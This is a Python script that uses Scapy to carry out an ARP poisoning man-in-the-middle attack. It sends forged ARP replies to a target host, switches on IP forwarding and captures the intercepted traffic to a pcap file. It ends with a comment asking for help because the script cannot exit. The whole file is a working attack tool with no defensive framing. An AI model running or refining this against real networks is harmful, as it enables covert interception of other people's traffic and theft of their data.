# -*- coding: UTF-8 -*-
from scapy.all import *
import os
import sys
import signal
import threading
from optparse import OptionParser

usage = 'Usage:%prog -i interface -t target_ip -c packet_count -f file_path'

parser = OptionParser(usage)
parser.add_option('-i',dest="interface",help='Specify the interface to use')
parser.add_option('-t',dest='target',help='Specify a particular host to ARP posion')
parser.add_option('-d',dest='disguise',help='Specify a host you want to fake')
parser.add_option('-c',dest='packet_c',help="How many packets you want to catch(optional)")
parser.add_option('-f',dest='file_p',help='The packets path you want to save(optional)')
(options,args)=parser.parse_args()
interface = options.interface
target = options.target
disguise = options.disguise
packet_count = options.packet_c
file_path = options.file_p

if target is None:
	print 'target ip can\'t be none'
	parser.print_help()
	sys.exit(0)
elif interface is None:
	print 'Interface can\'t be none'
	parser.print_help()
	sys.exit(0)
elif disguise is None:
	print 'Must fake oneself'
	parser.print_help()
	sys.exit(0)

if packet_count is None:
	packet_count = 1000
if file_path is None:
	file_path = "arp.pcap"

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def make_attarp(interface,target_ip,dis_ip):
	my_mac = get_if_hwaddr(interface)
	target_mac = getmacbyip(target_ip)
	poison = Ether(src=my_mac,dst=target_mac)/ARP(hwsrc=my_mac,psrc=dis_ip,hwdst=target_mac,pdst=target_ip,op=2)
	print "make!"
	return poison

poison = make_attarp(interface,target,disguise)

def kill_s():
	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
	os.kill(os.getpid(),signal.SIGINT)

def poison_tar(posion,interface):
	try:	
		while True:
			sendp(poison,inter=2,iface=interface)
	except KeyboardInterrupt:
		print "finish!"
		kill_s()
	return

poison_th = threading.Thread(target=poison_tar,args=(poison,interface))
poison_th.start()
print "begin!"

try:
	packets = sniff(count=packet_count,iface=interface)
	wrpcap(file_path,packets)
	kill_s()
except KeyboardInterrupt:
	kill_s()
	sys.exit(0)

#help me change the code it can't exit
